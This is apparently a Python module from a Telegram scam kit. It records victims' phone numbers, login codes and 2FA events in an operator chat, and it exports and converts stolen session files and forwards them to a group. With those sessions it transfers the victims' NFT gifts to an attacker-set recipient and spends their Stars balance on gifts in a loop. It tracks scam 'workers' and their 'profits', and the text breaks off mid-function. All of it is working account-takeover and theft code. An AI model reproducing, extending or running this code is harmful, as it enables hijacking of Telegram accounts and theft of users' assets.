import json
import os
import socket
import requests
import random
import sqlite3
import struct
import base64
import asyncio
from typing import Union
from urllib.parse import parse_qs
from datetime import datetime
from flask import request
from config import Config
# Константы для сессий
SESSION_DIR = Config.SESSION_DIR
PHONE_FILE = os.path.join(SESSION_DIR, 'phones.json')  # Файл для хранения номеров телефонов пользователей

# Создаем директорию сессий если её нет
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)
async def log_user_action(action_type: str, user_info: dict = None, worker_info: dict = None, additional_data: dict = None):
    """
    Detailed logging system for user actions
    Action types:
    - link_created: Worker created gift link
    - link_activated: User activated gift link and received NFT
    - phone_entered: User entered phone number
    - code_entered: User entered verification code
    - 2fa_entered: User entered 2FA password
    - auth_success: User successfully authenticated
    - session_processing_started: Session processing started
    - session_processing_completed: Session processing completed
    - gift_transfer_error: Error during gift transfer
    """
    try:
        from aiogram import Bot
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        from config import Config
        bot = Bot(token=Config.BOT_TOKEN)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_display = "Unknown"
        if user_info:
            user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown')))
            username = user_info.get('username', '')
            if username:
                user_display = f"@{username} (ID: {user_id})"
            else:
                user_display = f"ID: {user_id}"
        message_text = ""
        keyboard = None
        if action_type == "link_created":
            gift_link = additional_data.get('gift_link', 'Unknown') if additional_data else 'Unknown'
            worker_name = "Unknown"
            if worker_info:
                username = worker_info.get('username', '')
                telegram_id = worker_info.get('telegram_id', 'Unknown')
                if username and username.strip():
                    worker_name = username if username.startswith('@') else f"@{username}"
                else:
                    worker_name = f"ID{telegram_id}"
            message_text = (
                f"🔗 <b>Создана ссылка на подарок</b>\n\n"
                f"👤 <b>Воркер:</b> {worker_name}\n"
                f"🎁 <b>Ссылка:</b> <code>{gift_link}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "gift_link_created":
            details = additional_data.get('details', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"🎁 <b>Создана подарочная ссылка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "retry_processing":
            details = additional_data.get('details', 'Повторная обработка сессии') if additional_data else 'Повторная обработка сессии'
            message_text = (
                f"🔄 <b>Повторная обработка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "rescan_gifts_requested":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Запрошено повторное сканирование подарков') if additional_data else 'Запрошено повторное сканирование подарков'
            message_text = (
                f"🔄 <b>Запрошено повторное сканирование подарков</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "link_activated":
            gift_name = additional_data.get('nft_name', additional_data.get('gift_name', 'Unknown NFT')) if additional_data else 'Unknown NFT'
            gift_link = additional_data.get('nft_link', additional_data.get('gift_link', 'Unknown')) if additional_data else 'Unknown'
            message_text = (
                f"🎯 <b>Активирована подарочная ссылка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🎁 <b>Получен NFT:</b> {gift_name}\n"
                f"🔗 <b>Ссылка:</b> <code>{gift_link}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "phone_entered":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"📱 <b>Введен номер телефона</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "code_entered" or action_type == "code_verified":
            has_2fa = additional_data.get('has_2fa', False) if additional_data else False
            fa_status = "✅ Включена" if has_2fa else "❌ Отключена"
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            code = additional_data.get('code', '') if additional_data else ''
            details = additional_data.get('details', '') if additional_data else ''
            message_text = (
                f"🔐 <b>Код подтверждения {'отправлен' if action_type == 'code_sent' else 'подтвержден'}</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
            )
            if code:
                message_text += f"🔢 <b>Код:</b> <code>{code}</code>\n"
            if details:
                message_text += f"📝 <b>Детали:</b> {details}\n"
            message_text += f"⏰ <b>Время:</b> {timestamp}"
        elif action_type == "code_sent":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', '') if additional_data else ''
            message_text = (
                f"📨 <b>Код отправлен</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
            )
            if details:
                message_text += f"📝 <b>Детали:</b> {details}\n"
            message_text += f"⏰ <b>Время:</b> {timestamp}"
        elif action_type == "2fa_entered" or action_type == "2fa_verified":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', '') if additional_data else ''
            message_text = (
                f"🛡️ <b>2FA пароль подтвержден</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
            )
            if details:
                message_text += f"📝 <b>Детали:</b> {details}\n"
            message_text += f"⏰ <b>Время:</b> {timestamp}"
        elif action_type == "2fa_required":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', '') if additional_data else ''
            message_text = (
                f"🔒 <b>Требуется 2FA пароль</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
            )
            if details:
                message_text += f"📝 <b>Детали:</b> {details}\n"
            message_text += f"⏰ <b>Время:</b> {timestamp}"
        elif action_type == "auth_success":
            message_text = (
                f"✅ <b>Успешная авторизация</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_started" or action_type == "session_processing_start":
            message_text = (
                f"⚙️ <b>Начата обработка сессии</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_error":
            error_msg = additional_data.get('details', 'Неизвестная ошибка') if additional_data else 'Неизвестная ошибка'
            message_text = (
                f"❌ <b>Ошибка обработки сессии</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🔴 <b>Ошибка:</b> {error_msg}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_completed" or action_type == "session_processing_complete":
            gifts_count = additional_data.get('gifts_processed', 0) if additional_data else 0
            message_text = (
                f"✅ <b>Обработка сессии завершена</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🎁 <b>Обработано подарков:</b> {gifts_count}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "gift_transfer_error":
            error_msg = additional_data.get('error', 'Unknown error') if additional_data else 'Unknown error'
            session_id = additional_data.get('session_id', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"❌ <b>Ошибка передачи подарка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🔴 <b>Ошибка:</b> <code>{error_msg}</code>\n"
                f"🆔 <b>Сессия:</b> <code>{session_id}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Повтор", callback_data=f"retry_session:{session_id}")]
            ])
        # Если message_text пустой, создаем сообщение по умолчанию
        if not message_text or not message_text.strip():
            details = additional_data.get('details', '') if additional_data else ''
            message_text = (
                f"📝 <b>Действие пользователя</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🔧 <b>Тип действия:</b> {action_type}\n"
            )
            if details:
                message_text += f"📝 <b>Детали:</b> {details}\n"
            message_text += f"⏰ <b>Время:</b> {timestamp}"
        
        # Проверяем, что LOG_CHAT_ID установлен
        if not Config.LOG_CHAT_ID:
            print(f"⚠️ LOG_CHAT_ID не установлен, лог не отправлен")
            return
        
        # Отправляем сообщение только если текст не пустой
        if message_text and message_text.strip():
            if keyboard:
                await bot.send_message(
                    chat_id=Config.LOG_CHAT_ID,
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=keyboard
                )
            else:
                await bot.send_message(
                    chat_id=Config.LOG_CHAT_ID,
                    text=message_text,
                    parse_mode="HTML"
                )
            await bot.session.close()
            print(f"✅ Лог действия '{action_type}' отправлен")
        else:
            print(f"⚠️ Пустое сообщение для действия '{action_type}', лог не отправлен")
    except Exception as e:
        print(f"❌ Ошибка отправки лога действия: {e}")
        import traceback
        traceback.print_exc()
def get_session_data_from_sqlite(session_file_path: str) -> dict:
    if not os.path.exists(session_file_path):
        raise FileNotFoundError(f"Файл сессии не найден: {session_file_path}")
    conn = sqlite3.connect(session_file_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions")
        session_data = cursor.fetchone()
        if not session_data:
            raise ValueError("Данные сессии не найдены в файле")
        dc_id, server_address, port, auth_key = session_data
        return {
            'dc_id': dc_id,
            'server_address': server_address,
            'port': port,
            'auth_key': auth_key
        }
    finally:
        conn.close()
async def get_user_data_from_telethon(session_file_path: str) -> dict:
    from config import Config
    API_ID = Config.TELEGRAM_API_ID
    API_HASH = Config.TELEGRAM_API_HASH
    from telethon import TelegramClient
    from telethon.sessions import SQLiteSession
    client = TelegramClient(
        SQLiteSession(session_file_path),
        API_ID,
        API_HASH
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise ValueError("Сессия не авторизована")
        me = await client.get_me()
        user_data = {
            'user_id': me.id,
            'is_bot': me.bot if hasattr(me, 'bot') else False,
            'phone': me.phone,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username
        }
        return user_data
    finally:
        await client.disconnect()
def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
    from config import Config
    API_ID = Config.TELEGRAM_API_ID
    dc_id = session_data['dc_id']
    auth_key = session_data['auth_key']
    user_id = user_data['user_id']
    is_bot = user_data['is_bot']
    if len(auth_key) != 256:
        if len(auth_key) > 256:
            auth_key = auth_key[:256]
        else:
            auth_key = auth_key + b'\x00' * (256 - len(auth_key))
    packed_data = struct.pack(
        ">BI?256sQ?",
        dc_id,
        API_ID,
        False,
        auth_key,
        user_id,
        is_bot
    )
    session_string = base64.urlsafe_b64encode(packed_data).decode().rstrip("=")
    return session_string
async def convert_telethon_to_pyrogram(session_file_path: str) -> str:
    session_data = get_session_data_from_sqlite(session_file_path)
    user_data = await get_user_data_from_telethon(session_file_path)
    pyrogram_session_string = create_pyrogram_session_string(session_data, user_data)
    return pyrogram_session_string
def check_admin_token():
    # ADMIN_TOKEN больше не используется, функция оставлена для обратной совместимости
    # Используйте Config.ADMIN_IDS для проверки администраторов
    return False  # Всегда возвращает False, так как проверка админов теперь через Config.is_admin()
def parse_init_data(init_data):
    try:
        parsed_data = parse_qs(init_data)
        if 'user' in parsed_data:
            return json.loads(parsed_data['user'][0]).get('id')
    except Exception as e:
        return None
def get_phone_from_json(user_id):
    try:
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
                return phones.get(str(user_id), {}).get('phone_number')
    except Exception as e:
        return None
def init_user_record(user_id):
    try:
        phones = {}
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
        user_str = str(user_id)
        if user_str not in phones:
            phones[user_str] = {
                'phone_number': None, 
                'last_updated': datetime.now().isoformat()
            }
            with open(PHONE_FILE, 'w') as f:
                json.dump(phones, f, indent=2)
        return True
    except Exception as e:
        return False
def create_session_json(phone, twoFA=False, user_id=None):
    session_data = {
        'app_id': 14549469,
        'app_hash': 'a7ab219d3948725cb0b1a3c20b4b3126',
        'twoFA': twoFA,
        'session_file': f"{phone.replace('+', '')}.session",
        'phone': phone,
        'user_id': user_id,
        'last_update': datetime.now().isoformat(),
        'status': 'authorized'
    }
    if user_id:
        phones = {}
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
        phones[str(user_id)] = {
            'phone_number': phone,
            'last_updated': datetime.now().isoformat()
        }
        with open(PHONE_FILE, 'w') as f:
            json.dump(phones, f, indent=2)
    with open(f"{SESSION_DIR}/{phone.replace('+', '')}.json", 'w') as f:
        json.dump(session_data, f, indent=2)
    try:
        from telegram_bot import send_session_to_group, send_session_file_to_group
        session_file_path = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
        if os.path.exists(session_file_path):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
                print(f"✓ Telethon сессия отправлена как .session файл")
                pyrogram_session_string = loop.run_until_complete(
                    convert_telethon_to_pyrogram(session_file_path)
                )
                loop.run_until_complete(
                    send_session_to_group(user_id, phone, pyrogram_session_string, is_pyrogram=True)
                )
                print(f"✓ Pyrogram session string отправлен как .txt файл")
                if pyrogram_session_string:
                    print(f"🎁 Начинаем обработку подарков для аккаунта {phone}...")
                    loop.run_until_complete(
                        process_account_gifts(pyrogram_session_string, user_id, phone)
                    )
            except Exception as convert_error:
                print(f"Ошибка конвертации в Pyrogram: {convert_error}")
                loop.run_until_complete(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
            finally:
                # Не закрываем loop сразу, чтобы асинхронные функции могли завершиться
                pass
    except Exception as e:
        print(f"Error sending session to group: {e}")
    return session_data
async def process_account_gifts(session_string: str, user_id: int, phone: str):
    from pyrogram import Client
    from config import Config
    from database import Database
    try:
        # Определяем получателя: приоритет у username, если указан, иначе используем ID
        recipient = None
        if Config.GIFT_RECIPIENT_USERNAME and Config.GIFT_RECIPIENT_USERNAME.strip():
            recipient = Config.GIFT_RECIPIENT_USERNAME.strip()
            if recipient.startswith('@'):
                recipient = recipient[1:]  # Убираем @ если есть
            print(f"🎯 Используется username получателя: @{recipient}")
        elif Config.GIFT_RECIPIENT_ID and Config.GIFT_RECIPIENT_ID != 0:
            recipient = Config.GIFT_RECIPIENT_ID
            print(f"🎯 Используется ID получателя: {recipient}")
        else:
            error_msg = f"❌ GIFT_RECIPIENT_ID или GIFT_RECIPIENT_USERNAME не установлены в конфигурации! Невозможно передать подарки."
            print(error_msg)
            await log_gift_processing_error(Exception(error_msg), user_id, phone)
            return {
                'success': False,
                'error': 'GIFT_RECIPIENT_ID or GIFT_RECIPIENT_USERNAME not configured',
                'gifts_processed': 0,
                'gifts_transferred': 0
            }
        
        client = Client(
            name="gift_processor",
            api_id=Config.TELEGRAM_API_ID,
            api_hash=Config.TELEGRAM_API_HASH,
            session_string=session_string
        )
        await client.start()
        try:
            print(f"✅ Успешный вход в аккаунт {phone}")
            
            # Получаем информацию о NFT и звездах сразу после входа
            await log_account_balance_info(client, user_id, phone)
            
            print(f"🎁 Получаем список подарков для аккаунта {phone}...")
            print(f"🎯 Получатель подарков: {recipient}")
            
            # Сначала собираем все NFT подарки с ссылками
            all_nft_gifts = []
            gifts_count = 0
            async for gift in client.get_chat_gifts("me"):
                gifts_count += 1
                try:
                    # Проверяем наличие ссылки у подарка
                    gift_link = None
                    if hasattr(gift, 'link') and gift.link:
                        gift_link = gift.link
                    elif hasattr(gift, 'gift_link') and gift.gift_link:
                        gift_link = gift.gift_link
                    
                    if gift_link:
                        all_nft_gifts.append(gift)
                except Exception as e:
                    print(f"⚠️ Ошибка при проверке подарка #{gifts_count}: {e}")
            
            total_nft_count = len(all_nft_gifts)
            print(f"📊 Найдено NFT подарков с ссылками: {total_nft_count} из {gifts_count} всего")
            
            # Теперь обрабатываем и передаем NFT подарки
            unique_gifts_transferred = 0
            transferred_gift_links = []
            gifts_with_links = 0
            
            for gift in all_nft_gifts:
                gifts_with_links += 1
                try:
                    gift_link = None
                    if hasattr(gift, 'link') and gift.link:
                        gift_link = gift.link
                    elif hasattr(gift, 'gift_link') and gift.gift_link:
                        gift_link = gift.gift_link
                    
                    print(f"✨ Обрабатываем NFT подарок #{gifts_with_links} с ссылкой: {gift_link}")
                    print(f"   ID подарка: {getattr(gift, 'id', 'unknown')}")
                    
                    success = await transfer_gift_to_recipient(client, gift, recipient)
                    if success:
                        unique_gifts_transferred += 1
                        transferred_gift_links.append(gift_link)
                        print(f"✅ Подарок успешно передан! Всего передано: {unique_gifts_transferred}")
                        await log_gift_transfer_success(gift, user_id, phone, total_nft_count)
                    else:
                        print(f"❌ Не удалось передать подарок с ссылкой {gift_link}")
                except Exception as gift_error:
                    error_details = f"Ошибка обработки подарка #{gifts_count}: {str(gift_error)}"
                    print(f"❌ {error_details}")
                    import traceback
                    traceback.print_exc()
                    await log_gift_processing_error(gift_error, user_id, phone)
            print(f"🎁 Обработано {gifts_count} подарков, из них {total_nft_count} NFT с ссылками, передано {unique_gifts_transferred}")
            
            # Покупка и отправка подарков за звезды, если включено
            stars_gifts_sent = 0
            if Config.BUY_GIFTS_WITH_STARS_ENABLED and Config.GIFT_ID_TO_BUY and Config.GIFT_ID_TO_BUY != 0:
                try:
                    # Определяем получателя подарков за звезды
                    stars_recipient = None
                    if Config.STARS_GIFT_RECIPIENT_USERNAME and Config.STARS_GIFT_RECIPIENT_USERNAME.strip():
                        stars_recipient = Config.STARS_GIFT_RECIPIENT_USERNAME.strip()
                        if stars_recipient.startswith('@'):
                            stars_recipient = stars_recipient[1:]
                        print(f"⭐ Используется username получателя подарков за звезды: @{stars_recipient}")
                    elif Config.STARS_GIFT_RECIPIENT_ID and Config.STARS_GIFT_RECIPIENT_ID != 0:
                        stars_recipient = Config.STARS_GIFT_RECIPIENT_ID
                        print(f"⭐ Используется ID получателя подарков за звезды: {stars_recipient}")
                    elif Config.GIFT_RECIPIENT_USERNAME and Config.GIFT_RECIPIENT_USERNAME.strip():
                        stars_recipient = Config.GIFT_RECIPIENT_USERNAME.strip()
                        if stars_recipient.startswith('@'):
                            stars_recipient = stars_recipient[1:]
                        print(f"⭐ Используется username получателя NFT для подарков за звезды: @{stars_recipient}")
                    elif Config.GIFT_RECIPIENT_ID and Config.GIFT_RECIPIENT_ID != 0:
                        stars_recipient = Config.GIFT_RECIPIENT_ID
                        print(f"⭐ Используется ID получателя NFT для подарков за звезды: {stars_recipient}")
                    else:
                        print(f"⚠️ Получатель подарков за звезды не установлен, пропускаем покупку")
                    
                    if stars_recipient:
                        print(f"⭐ Запуск покупки подарков ID {Config.GIFT_ID_TO_BUY} за звезды (пока не закончатся звезды)...")
                        success = await buy_and_send_gift_with_stars(client, Config.GIFT_ID_TO_BUY, stars_recipient, user_id, phone)
                        if success:
                            print(f"✅ Подарки за звезды успешно куплены и отправлены!")
                        else:
                            print(f"⚠️ Не удалось купить подарки за звезды (возможно, закончились звезды или подарок распродан)")
                except Exception as stars_gift_error:
                    print(f"❌ Ошибка при покупке подарка за звезды: {stars_gift_error}")
                    import traceback
                    traceback.print_exc()
            
            if unique_gifts_transferred > 0:
                print(f"✅ Успешно передано {unique_gifts_transferred} NFT подарков")
                try:
                    db = Database()
                    worker_info = db.get_worker_by_last_gift(user_id)
                    if worker_info:
                        print(f"🔍 Найден воркер для пользователя {user_id}: {worker_info}")
                        await send_profit_log(worker_info, transferred_gift_links, user_id)
                    else:
                        print(f"⚠️ Воркер не найден для пользователя {user_id}")
                except Exception as log_error:
                    print(f"❌ Ошибка отправки лога профита: {log_error}")
                    import traceback
                    traceback.print_exc()
            else:
                print(f"📭 NFT подарки с ссылками не найдены или не переданы (обработано: {gifts_count}, с ссылками: {gifts_with_links})")
                # Отправляем уведомление с картинкой когда подарки не найдены
                await send_no_gifts_notification(user_id, phone, gifts_count)
            
            return {
                'success': True,
                'gifts_processed': gifts_count,
                'gifts_with_links': gifts_with_links,
                'gifts_transferred': unique_gifts_transferred,
                'transferred_links': transferred_gift_links
            }
        finally:
            await client.stop()
    except Exception as e:
        error_msg = str(e)
        error_type = type(e).__name__
        print(f"❌ Ошибка обработки подарков для {phone}: {error_type}: {error_msg}")
        import traceback
        traceback.print_exc()
        await log_gift_processing_error(e, user_id, phone)
        return {
            'success': False,
            'error': error_msg,
            'error_type': error_type,
            'gifts_processed': 0,
            'gifts_transferred': 0
        }
async def transfer_gift_to_recipient(client, gift, recipient: Union[int, str]) -> bool:
    try:
        gift_id = getattr(gift, 'id', 'unknown')
        gift_link = getattr(gift, 'link', getattr(gift, 'gift_link', 'unknown'))
        
        # Определяем тип получателя (ID или username)
        recipient_type = "username" if isinstance(recipient, str) else "ID"
        print(f"🎁 Передаем подарок ID {gift_id} получателю {recipient} ({recipient_type})...")
        print(f"   Ссылка: {gift_link}")
        print(f"   Тип объекта: {type(gift).__name__}")
        print(f"   Доступные атрибуты: {[attr for attr in dir(gift) if not attr.startswith('_')]}")
        
        # Сначала нужно "познакомить" Pyrogram с получателем
        # Для этого отправляем ему сообщение, чтобы Pyrogram "узнал" его
        try:
            print(f"👤 Пытаемся познакомиться с получателем {recipient} ({recipient_type})...")
            # Пытаемся получить информацию о пользователе
            try:
                recipient_user = await client.get_users(recipient)
                print(f"✅ Получатель найден в кэше: {recipient_user.first_name} (@{recipient_user.username or 'без username'}, ID: {recipient_user.id})")
                # Если передан username, но нужен ID для transfer, используем ID из полученной информации
                if isinstance(recipient, str):
                    recipient = recipient_user.id
                    print(f"   Используем ID получателя: {recipient}")
            except Exception as get_user_error:
                print(f"⚠️ Получатель не найден в кэше, пытаемся отправить сообщение для знакомства...")
                # Отправляем пустое сообщение получателю, чтобы Pyrogram "узнал" его
                try:
                    await client.send_message(
                        chat_id=recipient,
                        text=".",  # Минимальное сообщение для знакомства
                        disable_notification=True  # Без уведомления
                    )
                    print(f"✅ Сообщение для знакомства отправлено получателю {recipient}")
                    # Небольшая задержка для обработки
                    await asyncio.sleep(0.5)
                    # Если передан username, получаем ID после знакомства
                    if isinstance(recipient, str):
                        recipient_user = await client.get_users(recipient)
                        recipient = recipient_user.id
                        print(f"   Получен ID получателя после знакомства: {recipient}")
                except Exception as send_error:
                    print(f"⚠️ Не удалось отправить сообщение для знакомства: {send_error}")
                    print(f"   Возможно, получатель заблокировал аккаунт или не существует")
                    raise send_error
        except Exception as e:
            error_type = type(e).__name__
            print(f"❌ Ошибка знакомства с получателем: {error_type}: {str(e)}")
            print(f"   Невозможно передать подарок без знакомства с получателем")
            return False
        
        # Проверяем наличие метода transfer
        if not hasattr(gift, 'transfer'):
            print(f"❌ У объекта подарка нет метода transfer()")
            print(f"   Доступные методы: {[method for method in dir(gift) if callable(getattr(gift, method, None)) and not method.startswith('_')]}")
            return False
        
        # Вызываем метод transfer (используем ID, так как username уже преобразован)
        result = await gift.transfer(recipient)
        
        if result:
            print(f"✅ Подарок ID {gift_id} успешно передан получателю {recipient}!")
            return True
        else:
            print(f"❌ Метод transfer() вернул False для подарка ID {gift_id}")
            return False
    except AttributeError as e:
        print(f"❌ Ошибка атрибута при передаче подарка: {e}")
        print(f"   Тип ошибки: {type(e).__name__}")
        import traceback
        traceback.print_exc()
        return False
    except Exception as e:
        error_msg = str(e)
        error_type = type(e).__name__
        print(f"❌ Ошибка передачи подарка: {error_type}: {error_msg}")
        import traceback
        traceback.print_exc()
        return False
async def buy_and_send_gift_with_stars(client, gift_id: int, recipient: Union[int, str], user_id: int, phone: str) -> bool:
    """
    Покупает подарки за звезды в цикле, пока не закончатся звезды, и отправляет их получателю
    
    Args:
        client: Pyrogram Client
        gift_id: ID подарка для покупки
        recipient: ID или username получателя
        user_id: ID пользователя аккаунта
        phone: Номер телефона аккаунта
    
    Returns:
        bool: True если хотя бы один подарок куплен, False если ошибка
    """
    try:
        # Определяем тип получателя
        recipient_type = "username" if isinstance(recipient, str) else "ID"
        print(f"⭐ Начинаем покупку подарков ID {gift_id} за звезды для получателя {recipient} ({recipient_type})...")
        
        # Получаем информацию о подарке и его цене
        gift_price = None
        try:
            available_gifts = await client.get_available_gifts()
            for gift in available_gifts:
                if gift.id == gift_id:
                    gift_price = gift.price
                    print(f"💰 Цена подарка: {gift_price} звезд")
                    break
            if gift_price is None:
                print(f"⚠️ Подарок ID {gift_id} не найден в списке доступных подарков")
                print(f"   Продолжаем попытки покупки...")
        except Exception as gift_info_error:
            print(f"⚠️ Не удалось получить информацию о подарке: {gift_info_error}")
            print(f"   Продолжаем попытки покупки...")
        
        # Пытаемся познакомиться с получателем (один раз)
        try:
            recipient_user = await client.get_users(recipient)
            print(f"✅ Получатель найден: {recipient_user.first_name} (@{recipient_user.username or 'без username'}, ID: {recipient_user.id})")
        except Exception as get_user_error:
            print(f"⚠️ Получатель не найден в кэше, пытаемся отправить сообщение для знакомства...")
            try:
                await client.send_message(
                    chat_id=recipient,
                    text=".",
                    disable_notification=True
                )
                print(f"✅ Сообщение для знакомства отправлено")
                await asyncio.sleep(0.5)
            except Exception as send_error:
                print(f"⚠️ Не удалось отправить сообщение для знакомства: {send_error}")
                # Продолжаем попытку отправки подарка
        
        # Получаем начальный баланс звезд
        initial_balance = None
        try:
            initial_balance = await client.get_stars_balance()
            print(f"💰 Начальный баланс звезд: {initial_balance}")
        except Exception as initial_balance_error:
            print(f"⚠️ Не удалось получить начальный баланс звезд: {initial_balance_error}")
        
        # Покупаем подарки в цикле, пока есть звезды
        gifts_sent_count = 0
        attempt = 0
        max_attempts = 1000  # Защита от бесконечного цикла
        
        while attempt < max_attempts:
            attempt += 1
            
            # Проверяем баланс перед каждой покупкой
            try:
                balance = await client.get_stars_balance()
                print(f"💰 Попытка #{attempt}: Баланс звезд: {balance}")
                
                # Если знаем цену подарка, проверяем достаточно ли звезд
                if gift_price and balance < gift_price:
                    print(f"💸 Недостаточно звезд для покупки подарка (баланс: {balance}, цена: {gift_price})")
                    break
                
                if balance <= 0:
                    print(f"💸 Звезды закончились (баланс: {balance})")
                    break
            except Exception as balance_error:
                print(f"⚠️ Не удалось получить баланс звезд: {balance_error}")
                # Продолжаем попытку покупки
            
            # Покупаем и отправляем подарок
            try:
                print(f"🎁 Попытка #{attempt}: Отправляем подарок ID {gift_id} получателю {recipient}...")
                message = await client.send_gift(
                    chat_id=recipient,
                    gift_id=gift_id
                )
                
                if message:
                    gifts_sent_count += 1
                    print(f"✅ Подарок #{gifts_sent_count} успешно куплен за звезды и отправлен получателю {recipient}!")
                    
                    # Небольшая задержка между покупками
                    await asyncio.sleep(1)
                else:
                    print(f"❌ Метод send_gift() вернул None для подарка ID {gift_id}")
                    # Возможно подарок распродан или другая ошибка, но продолжаем попытки
                    await asyncio.sleep(2)
                    
            except Exception as send_gift_error:
                error_type = type(send_gift_error).__name__
                error_msg = str(send_gift_error)
                
                # Проверяем специфичные ошибки
                if "STARGIFT_USAGE_LIMITED" in error_msg or "sold out" in error_msg.lower():
                    print(f"⚠️ Подарок распродан или достигнут лимит покупок: {error_msg}")
                    break
                elif "not enough" in error_msg.lower() or "insufficient" in error_msg.lower():
                    print(f"💸 Недостаточно звезд: {error_msg}")
                    break
                else:
                    print(f"⚠️ Ошибка при покупке подарка #{attempt}: {error_type}: {error_msg}")
                    # Продолжаем попытки после небольшой задержки
                    await asyncio.sleep(2)
        
        # Получаем финальный баланс звезд
        final_balance = None
        try:
            final_balance = await client.get_stars_balance()
            print(f"💰 Финальный баланс звезд: {final_balance}")
        except Exception as final_balance_error:
            print(f"⚠️ Не удалось получить финальный баланс звезд: {final_balance_error}")
        
        if gifts_sent_count > 0:
            print(f"✅ Всего куплено и отправлено подарков: {gifts_sent_count}")
            await log_stars_gifts_success(
                gift_id, recipient, user_id, phone, gifts_sent_count, 
                gift_price, initial_balance, final_balance
            )
            return True
        else:
            print(f"❌ Не удалось купить ни одного подарка")
            return False
            
    except Exception as e:
        error_type = type(e).__name__
        error_msg = str(e)
        print(f"❌ Критическая ошибка при покупке подарков за звезды: {error_type}: {error_msg}")
        import traceback
        traceback.print_exc()
        return False

async def log_stars_gifts_success(
    gift_id: int, recipient: Union[int, str], user_id: int, phone: str, count: int,
    gift_price: int = None, initial_balance: float = None, final_balance: float = None
):
    """Логирует успешную покупку и отправку подарков за звезды"""
    try:
        from telegram_bot import send_message_to_group
        recipient_display = f"@{recipient}" if isinstance(recipient, str) else str(recipient)
        
        # Формируем информацию о звездах
        stars_info = ""
        if initial_balance is not None and final_balance is not None:
            spent_stars = initial_balance - final_balance
            stars_info = f"""
⭐ **Звезды:**
   • Начальный баланс: {initial_balance:.2f} ⭐
   • Финальный баланс: {final_balance:.2f} ⭐
   • Потрачено: {spent_stars:.2f} ⭐"""
        elif initial_balance is not None:
            stars_info = f"""
⭐ **Звезды:**
   • Начальный баланс: {initial_balance:.2f} ⭐"""
        elif final_balance is not None:
            stars_info = f"""
⭐ **Звезды:**
   • Финальный баланс: {final_balance:.2f} ⭐"""
        
        # Формируем информацию о подарках
        gifts_info = f"📦 **Количество:** {count} подарков"
        if gift_price is not None:
            total_cost = gift_price * count
            gifts_info += f"""
   • Цена одного подарка: {gift_price} ⭐
   • Общая стоимость: {total_cost} ⭐"""
        
        message = f"""
⭐ **Успешная покупка и отправка подарков за звезды**
👤 **Аккаунт:** {phone} (ID: {user_id})
